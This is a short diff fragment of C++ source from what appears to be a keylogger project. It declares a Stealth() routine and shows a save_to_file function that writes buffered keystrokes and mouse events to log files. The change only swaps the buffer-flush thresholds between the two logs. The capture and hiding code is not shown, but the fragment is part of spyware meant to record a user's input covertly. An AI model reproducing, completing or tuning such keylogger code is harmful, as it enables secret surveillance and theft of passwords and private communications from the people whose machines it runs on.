@@ -19,7 +19,7 @@ void Stealth();
 fstream file;
 
 void save_to_file(){
-    if(key_buffer.size() >= 50){
+    if(key_buffer.size() >= 25){
         file.open(key_log_file , ios::app | ios::out);
         while(! key_buffer.empty()){
             file<<key_buffer.front();
@@ -28,7 +28,7 @@ void save_to_file(){
         file.close();
     }
 
-    if(mouse_buffer.size() >= 25){
+    if(mouse_buffer.size() >= 50){
         file.open(mouse_log_file , ios::app | ios::out);
         while(! mouse_buffer.empty()){
             file<<mouse_buffer.front();
